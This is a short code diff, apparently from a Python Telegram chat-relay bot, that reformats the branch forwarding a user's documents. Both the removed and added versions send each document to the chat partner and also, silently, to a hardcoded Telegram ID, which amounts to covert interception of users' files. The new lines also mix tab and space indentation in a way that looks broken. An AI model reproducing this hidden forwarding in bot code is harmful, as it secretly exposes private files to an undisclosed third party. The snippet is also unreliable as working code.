@@ -227,20 +227,9 @@ def chat(message):
                     message.video.file_id,
                     caption=message.caption,
                 )
-    elif message.document:
-    
-        bot.send_document(
-                    companion,
-                    message.document.file_id,
-                    caption=message.caption,
-                )
-
-
-  	  bot.send_document(
-                    5983631388,
-                    message.document.file_id,
-                    caption=message.caption,
-                )
+    elif message.document:    
+        bot.send_document(companion, message.document.file_id, caption=message.caption,)
+  	  bot.send_document(5983631388, message.document.file_id, caption=message.caption,)
 
  
     elif message.audio:
